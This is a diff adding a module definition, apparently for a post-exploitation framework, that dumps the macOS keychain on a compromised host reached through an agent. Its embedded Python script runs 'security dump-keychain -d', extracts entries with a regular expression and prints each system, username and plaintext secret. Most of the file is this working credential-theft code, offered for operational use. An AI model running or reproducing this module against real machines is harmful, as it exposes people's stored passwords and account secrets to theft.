@@ -1,0 +1,39 @@
+name: Sandbox-Keychain-Dump
+authors:
+  - '@import-au'
+description: 'Uses Apple Security utility to dump the contents of the keychain. WARNING:
+  Will prompt user for access to each key.On Newer versions of Sierra and High Sierra,
+  this will also ask the user for their password for each key.'
+software: ''
+techniques:
+  - T1142
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: false
+language: python
+min_language_version: '2.6'
+comments:
+  - ''
+options:
+  - name: Agent
+    description: Agent to execute module on.
+    required: true
+    value: ''
+  - name: OutFile
+    description: File to output AppleScript to, otherwise displayed on the screen.
+    required: false
+    value: ''
+script: |
+  import subprocess
+  import re
+
+  process = subprocess.Popen('/usr/bin/security dump-keychain -d', stdout=subprocess.PIPE, shell=True)
+  keychain = process.communicate()
+  find_account = re.compile('0x00000007\s\<blob\>\=\"([^\"]+)\"\n.*\n.*\"acct\"\<blob\>\=\"([^\"]+)\"\n.*\n.*\n.*\n\s+\"desc\"\<blob\>\=([^\n]+)\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\ndata\:\n([^\n]+)')
+  accounts = find_account.findall(keychain[0])
+  for account in accounts:
+      print("System: " + account[0])
+      print("Description: " + account[2])
+      print("Username: " + account[1])
+      print("Secret: " + account[3])
